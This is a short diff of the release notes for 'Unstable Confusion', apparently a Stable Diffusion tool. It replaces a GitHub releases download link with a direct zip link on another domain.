@@ -12,4 +12,4 @@ v1.0 - Initial release (StableDiffusion 1.4)<br>
 The download package contains everything required.<br><br>
 
 <b>Download:</b><br>
-https://github.com/decipher2k/Unstable-Confusion/releases
+https://api.steinzeitjagd.de/public/Unstable%20Confusion.zip
